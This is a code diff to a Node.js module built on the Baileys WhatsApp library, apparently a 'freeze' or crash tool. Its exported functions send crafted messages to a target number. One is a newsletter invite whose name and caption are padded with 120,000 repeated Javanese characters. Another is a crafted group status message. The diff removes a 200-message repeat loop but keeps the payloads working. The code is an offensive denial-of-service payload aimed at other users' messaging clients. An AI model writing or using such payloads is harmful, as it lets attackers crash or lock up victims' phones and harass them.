@@ -26,7 +26,7 @@
 
 const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
 const pino = require('pino');
-const crypto = require('crypto')
+const crypto = require('crypto');
 
 async function xgcs(SYxS7, target) {
     const msg = generateWAMessageFromContent(target, {
@@ -56,57 +56,43 @@ async function xgcs(SYxS7, target) {
         additionalAttributes: { edit: "7" }
     });
 
-    const ms = 3;
-    const total = 200;
-
-    for (let i = 0; i < total; i++) {
-        try {
-            await SYxS7.relayMessage(target, {
-                groupStatusMessageV2: {
-                    message: msg.message
-                }
-            }, {
-                messageId: null
-            });
-
-            if (i < total - 1) {
-                await new Promise(resolve => setTimeout(resolve, ms * 1000));
+    try {
+        await SYxS7.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: msg.message
             }
-
-        } catch (error) {
-            console.log(`[ 🗑️ ] Error on message ${i + 1}: ${error.message}`);
-
-            if (i < total - 1) {
-                await new Promise(resolve => setTimeout(resolve, ms * 1000));
-            }
-        }
+        }, {
+            messageId: null
+        });
+    } catch (error) {
+        console.log(`[ 🗑️ ] Error on message: ${error.message}`);
     }
 }
 
 
 async function xgc(sam, target) {
-            try {
-                const messsage = {
-                    botInvokeMessage: {
-                        message: {
-                            newsletterAdminInviteMessage: {
-                                newsletterJid: '33333333333333333@newsletter',
-                                newsletterName: "Tere hakimu Chachi Ko paku" + "ꦾ".repeat(120000),
-                                jpegThumbnail: null,
-                                caption: "ꦽ".repeat(120000),
-                                inviteExpiration: Date.now() + 1814400000,
-                            },
-                        },
+    try {
+        const messsage = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: '33333333333333333@newsletter',
+                        newsletterName: "Tere hakimu Chachi Ko paku" + "ꦾ".repeat(120000),
+                        jpegThumbnail: null,
+                        caption: "ꦽ".repeat(120000),
+                        inviteExpiration: Date.now() + 1814400000,
                     },
-                };
-                await sam.relayMessage(target, messsage, {
-                    userJid: target,
-                });
-            }
-            catch (err) {
-                console.log(err);
-            }
-        }
+                },
+            },
+        };
+        await sam.relayMessage(target, messsage, {
+            userJid: target,
+        });
+    }
+    catch (err) {
+        console.log(err);
+    }
+}
 
 
 module.exports = { gcFrz: xgcs, xgcs, xgc };
